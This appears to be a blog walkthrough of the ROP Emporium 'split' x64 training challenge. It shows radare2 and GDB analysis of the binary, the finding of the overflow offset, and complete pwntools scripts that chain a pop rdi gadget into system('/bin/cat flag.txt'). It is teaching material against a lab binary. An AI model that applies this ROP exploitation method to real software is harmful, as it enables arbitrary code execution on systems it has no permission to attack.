---
layout: single
title:  "ROP Emporium - split (x64)"
date:   2020-10-09
excerpt: "split was a simple challenge from the rop emporium that required the pwner to build a ROP chain with two gadgets found within the ELF."
categories:
  - ctf
  - infosec
tags:
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

split was a simple challenge from the rop emporium that required the pwner to build a ROP chain with two gadgets found within the ELF.

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec split
[*] '/home/kali/ctf/rop-emporium/split/x64/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.

## Treasure Hunting

Since this is a CTF challenge, we need an objective. I normally start out by analyzing the binary and searching for interesting strings in `radare2`.
The command below analyzes the binary:

```
$ r2 split
[0x004005b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

Next, we can look for interesting strings:

```
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

The `/bin/cat flag.txt` flag looks very interesting!
Unfortunately, it wasn't referenced anywhere:

```
[0x004005b0]> axt @0x00601060
[0x004005b0]>
```

At this point, we can start looking at the executable's exported functions:

```
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   entry.fini0
0x00400690    1 7            entry.init0
0x004006e8    1 90           sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400742    1 17           sym.usefulFunction
0x00400560    1 6            sym.imp.system
0x004007d0    1 2            sym.__libc_csu_fini
0x004007d4    1 9            sym._fini
0x00400760    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

`usefulFunction()` looked interesting:

```
[0x004005b0]> pdf @sym.usefulFunction
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; "/bin/ls" ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
```

`usefulFunction()` invokes `/bin/ls`, however, we want to dump the flag's contents to stdout.
Our goal is to build a ROP chain to call `system("/bin/cat flag.txt")`. 

## Find the Crashing Offset

Ok, let's crash the app so we can find the offset in the stack buffer overflow where we can take control of the RIP register.
We can find the offset by generating [sequential chunks of De Brujin sequences](https://docs.pwntools.com/en/stable/util/cyclic.html) with pwntools' `cyclic()` function.
When the application crashes, the RSP (Stack Pointer) register will return to an offset within our sequence which we can lookup. When the program returns, the RIP register (Instruction Pointer Register) will be set to this value, relinquishing it's execution flow to us.

Once the app crashes, we lookup the value of the RSP register from the core dump and lookup the value with pwntools' `cyclic_find()` function. That will give us the offset from where we can take control of the RIP regsiter:

### exploit.py

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './split'

# Start the process
io = process(PROCESS)

# Attach a debugger
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

# Send a cyclic pattern
io.sendline(cyclic(128))

# Wait for the process to crash
io.wait()
```

```
$ python3 exploit.py
[+] Starting local process './split' argv=[b'./split'] : pid 3156
[*] running in new terminal: /usr/bin/gdb -q  "./split" 3156
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./split" 3156']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x81 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\n'

```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f1dfb5e4ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffef9431018  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007f1dfb6b5723  →  0x6b7670000000000a
$rdi   : 0x00007f1dfb6b7670  →  0x0000000000000000
$rip   : 0x0000000000400741  →  <pwnme+89> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff24b
$r11   : 0x246             
$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffef9431018│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007ffef9431020│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa"
0x00007ffef9431028│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa"
0x00007ffef9431030│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaa"
0x00007ffef9431038│+0x0020: "saaataaauaaavaaawaaaxaaa"
0x00007ffef9431040│+0x0028: "uaaavaaawaaaxaaa"
0x00007ffef9431048│+0x0030: "waaaxaaa"
0x00007ffef9431050│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40073a <pwnme+82>       call   0x400550 <puts@plt>
     0x40073f <pwnme+87>       nop    
     0x400740 <pwnme+88>       leave  
 →   0x400741 <pwnme+89>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped 0x400741 in pwnme (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400741 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Notice how the first 4 bytes in the RSP register are `kaaa`. We can lookup this value with pwntools to find the offset at which we can control RIP:

```
$ pwn cyclic -l kaaa
40
```

At 40 bytes into the stack buffer overflow, we can set value in the RIP address to an arbitrary value.

## Verify Control Over RIP

Let's verify that we took control over the RIP register by debugging the program in GDB.
In the exploit code below, we can set 40 bytes of padding followed by the 64-bit little-endian value to overwrite the RIP register.
Then, we flush all the program's output buffers so that we know it will be ready to read our payload, and then we send it and wait for the app to crash at 0xdeadbeef.
Please note that I use [gef](https://gef.readthedocs.io/en/master/) to make it easier to analyze stack values while developing binary exploits.

### exploit.py

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './split'

# Start the process
io = process(PROCESS)

# Attach a debugger
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

crash_size = 128
offset = 40
padding = b"A" * offset
rip = p64(0xdeadbeef)
remaining = b"B" * (crash_size - len(padding) - len(rip))
payload = b"".join([
   padding,
   rip,
   remaining
])

# Pwn!
io.clean()
io.sendline(payload)

# Wait for the process to crash
io.wait()
```

```
$ python3 exploit.py
[+] Starting local process './split' argv=[b'./split'] : pid 3219
[*] running in new terminal: /usr/bin/gdb -q  "./split" 3219
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./split" 3219']
[+] Waiting for debugger: Done
[DEBUG] Received 0x4c bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> '
[DEBUG] Sent 0x81 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  ef be ad de  00 00 00 00  │AAAA│AAAA│····│····│
    00000030  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000080  0a                                                  │·│
    00000081
```

```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped 0xdeadbeef in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────
```

Notice that we have successfully redirected execution of RIP to `0xdeadbeef`.

## Capturing the Flag

At this point, we need to build a ROP chain that will call `system("/bin/cat flag.txt")`.

Since the stack in this binary is non-executable, we need to construct a ROP chain, effectively reusing existing code in the executable.
The ROP chain when loaded onto the stack should look like the following:

```
pop rdi; ret; | "/bin/cat flag.txt" | system
```

Now, we just need to find memory addresses that point to the values in the ROP chain.

In x64, the first agrument that is passed to function calls goes in the `RDI` register, so we need to look for a `pop rdi; ret` gadget:

```
[0x004005b0]> /R pop rdi; ret;
  0x004007c3                 5f  pop rdi
  0x004007c4                 c3  ret
```

The `pop rdi; ret;` gadget is located at memory address `0x004007c3`.

Now, let's analyze the binary's strings:

```
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

`/bin/cat flag.txt` is located at memory address `0x00601060`. This string is located in the `.data` section of the ELF, meaning that it won't get relocated upon execution.

Now, let's analyze the binary's function imports:

```
[0x004005b0]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf

```

Since the binary imports the `system` function call, we can jump to address`0x00400560` in the PLT.


Excellent! We should have all the information we need to capture the flag now!

After overflowing the buffer, RIP will redirect its execution flow to a memory address pointing to a `pop edi; ret;` gadget in the ELF.
Since the memory address pointing to "/bin/cat flag.txt" will be the next value on the stack, it will get popped into the RDI register, hence setting the first argument for `system()`. *Note that this calling convention is specific to x64 assembly.*
Once we return from the first ROP gadget, the next memory address on the stack will point to `system()` and execution will be redictected to that function, dumping the flag.

Note that in the exploit code below, I set a breakpoint at the memory address where the old returning stack address was located so we follow the ROP chain's exection flow.

### exploit.py

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './split'

# Start the process
io = process(PROCESS)

# Attach a debugger
gdbscript = "b *0x0000000000400741"
pid = gdb.attach(io, gdbscript=gdbscript)

pop_rdi_ret = p64(0x004007c3)
cat_flag = p64(0x00601060)
system = p64(0x00400560)

offset = 40
padding = b"A" * offset
payload = b"".join([
   padding,
   pop_rdi_ret, # pop the "/bin/cat flag.txt" from the top of the stack into the RDI register
   cat_flag,    # /bin/cat flag.txt
   system,      # invoke system("/bin/cat flag.txt")
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './split' argv=[b'./split'] : pid 3780
[DEBUG] Wrote gdb script to '/tmp/pwnudvff804.gdb'
    b *0x0000000000400741
[*] running in new terminal: /usr/bin/gdb -q  "./split" 3780 -x /tmp/pwnudvff804.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./split" 3780 -x /tmp/pwnudvff804.gdb']
[+] Waiting for debugger: Done
[DEBUG] Received 0x4c bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  c3 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  60 10 60 00  00 00 00 00  60 05 40 00  00 00 00 00  │`·`·│····│`·@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
```

In the debugger, we can analyze our ROP chain in action:

1. We set a breakpoint on the pwnme() function's return address.
2. We can see that "/bin/cat flag.txt" will be popped into RDI.
3. We can see that we are calling `system()` with /bin/cat flag.txt as the first argument. In x64, the first argument is always read in the RDI register.

In the GDB output below, we see the execution of the first ROP gadget where the memory address on the top of the stack is popped into the RDI register.
This will set the first argument for our system() call which we will invoke in the next ROP gadget.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f69152b6ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffd6377d6f0  →  0x0000000000601060  →  "/bin/cat flag.txt"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f6915387723  →  0x389670000000000a
$rdi   : 0x00007f6915389670  →  0x0000000000000000
$rip   : 0x00000000004007c3  →  <__libc_csu_init+99> pop rdi
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff24b
$r11   : 0x246             
$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd6377d6f0│+0x0000: 0x0000000000601060  →  "/bin/cat flag.txt"   ← $rsp
0x00007ffd6377d6f8│+0x0008: 0x0000000000400560  →  <system@plt+0> jmp QWORD PTR [rip+0x200aba]        # 0x601020 <system@got.plt>
0x00007ffd6377d700│+0x0010: 0x00007ffd6377d70a  →  0x0697000000010000
0x00007ffd6377d708│+0x0018: 0x0000000100000000
0x00007ffd6377d710│+0x0020: 0x0000000000400697  →  <main+0> push rbp
0x00007ffd6377d718│+0x0028: 0x00007f69151ee7d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007ffd6377d720│+0x0030: 0x0000000000000000
0x00007ffd6377d728│+0x0038: 0x9863914f814d864d
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x4007c3 <__libc_csu_init+99> pop    rdi
     0x4007c4 <__libc_csu_init+100> ret    
     0x4007c5                  nop    
     0x4007c6                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x4007d0 <__libc_csu_fini+0> repz   ret
     0x4007d2                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped 0x4007c3 in __libc_csu_init (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007c3 → __libc_csu_init()
[#1] 0x400560 → puts@plt()
[#2] 0x7ffd6377d70a → add BYTE PTR [rax], al
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

In the GDB output below, we are now executing `system("/bin/cat flag.txt")` which will dump the flag.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f087be2dff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffed1725320  →  0x00007ffed172540a  →  0x000000007ffed172
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f087befe723  →  0xf00670000000000a
$rdi   : 0x0000000000601060  →  "/bin/cat flag.txt"
$rip   : 0x0000000000400560  →  <system@plt+0> jmp QWORD PTR [rip+0x200aba]        # 0x601020 <system@got.plt>
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff24b
$r11   : 0x246             
$r12   : 0x00000000004005b0  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffed1725320│+0x0000: 0x00007ffed172540a  →  0x000000007ffed172    ← $rsp
0x00007ffed1725328│+0x0008: 0x0000000100000000
0x00007ffed1725330│+0x0010: 0x0000000000400697  →  <main+0> push rbp
0x00007ffed1725338│+0x0018: 0x00007f087bd657d9  →  <init_cacheinfo+297> mov rbp, rax
0x00007ffed1725340│+0x0020: 0x0000000000000000
0x00007ffed1725348│+0x0028: 0x0555124cfbad465c
0x00007ffed1725350│+0x0030: 0x00000000004005b0  →  <_start+0> xor ebp, ebp
0x00007ffed1725358│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400550 <puts@plt+0>     jmp    QWORD PTR [rip+0x200ac2]        # 0x601018 <puts@got.plt>
     0x400556 <puts@plt+6>     push   0x0
     0x40055b <puts@plt+11>    jmp    0x400540
 →   0x400560 <system@plt+0>   jmp    QWORD PTR [rip+0x200aba]        # 0x601020 <system@got.plt>
     0x400566 <system@plt+6>   push   0x1
     0x40056b <system@plt+11>  jmp    0x400540
     0x400570 <printf@plt+0>   jmp    QWORD PTR [rip+0x200ab2]        # 0x601028 <printf@got.plt>
     0x400576 <printf@plt+6>   push   0x2
     0x40057b <printf@plt+11>  jmp    0x400540
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "split", stopped 0x400560 in system@plt (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400560 → system@plt()
[#1] 0x7ffed172540a → jb 0x7ffed17253dd
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

```
$ python3 exploit.py
[+] Starting local process './split' argv=[b'./split'] : pid 2906
[DEBUG] Wrote gdb script to '/tmp/pwn34gi4d8x.gdb'
    b main
[*] running in new terminal: /usr/bin/gdb -q  "./split" 2906 -x /tmp/pwn34gi4d8x.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./split" 2906 -x /tmp/pwn34gi4d8x.gdb']
[+] Waiting for debugger: Done
[DEBUG] Received 0x4c bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  c3 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  60 10 60 00  00 00 00 00  60 05 40 00  00 00 00 00  │`·`·│····│`·@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

And it looks like the flag is `ROPE{a_placeholder_32byte_flag!}`!

## Automating the Exploit

For the exploit above, we searched for all the ROP gadgets manually. This process can be automated with `pwntools`, so we can modify the exploit like the following:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './split'

# Start the process
io = process(PROCESS)

# Search for ROP gadgets
rop = ROP(io.elf)
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address)
cat_flag = p64(next(io.elf.search(b"/bin/cat flag.txt")))
system = p64(io.elf.symbols['system'])

# Build the ROP chain
rop.raw(pop_rdi_ret)
rop.raw(cat_flag)
rop.raw(system)
info(rop.dump())

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
   padding,
   rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

If you wish to learn more about the ROP feature in `pwntools`, you can use the [documentation as a reference](http://docs.pwntools.com/en/dev/rop/rop.html).

```
$ python3 exploit.py
[+] Starting local process './split' argv=[b'./split'] : pid 3367
[DEBUG] PLT 0x400550 puts
[DEBUG] PLT 0x400560 system
[DEBUG] PLT 0x400570 printf
[DEBUG] PLT 0x400580 memset
[DEBUG] PLT 0x400590 read
[DEBUG] PLT 0x4005a0 setvbuf
[*] '/home/kali/ctf/rop-emporium/split/x64/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './split'
[DEBUG] PLT 0x400550 puts
[DEBUG] PLT 0x400560 system
[DEBUG] PLT 0x400570 printf
[DEBUG] PLT 0x400580 memset
[DEBUG] PLT 0x400590 read
[DEBUG] PLT 0x4005a0 setvbuf
[DEBUG] PLT 0x400550 puts
[DEBUG] PLT 0x400560 system
[DEBUG] PLT 0x400570 printf
[DEBUG] PLT 0x400580 memset
[DEBUG] PLT 0x400590 read
[DEBUG] PLT 0x4005a0 setvbuf
[*] 0x0000: b'\xc3\x07@\x00\x00\x00\x00\x00' b'\xc3\x07@\x00\x00\x00\x00\x00'
    0x0008: b'`\x10`\x00\x00\x00\x00\x00' b'`\x10`\x00\x00\x00\x00\x00'
    0x0010: b'`\x05@\x00\x00\x00\x00\x00' b'`\x05@\x00\x00\x00\x00\x00'
[DEBUG] Received 0x4c bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  c3 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  60 10 60 00  00 00 00 00  60 05 40 00  00 00 00 00  │`·`·│····│`·@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
ROPE{a_placeholder_32byte_flag!}
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 3367)
[*] Got EOF while reading in interactive
```

And we get the flag!

The benefit to automating exploit development with the `pwntools` ROP module is so that you can still try the exploit when the binary changes and adjust the offsets of the ROP gadgets accordingly.
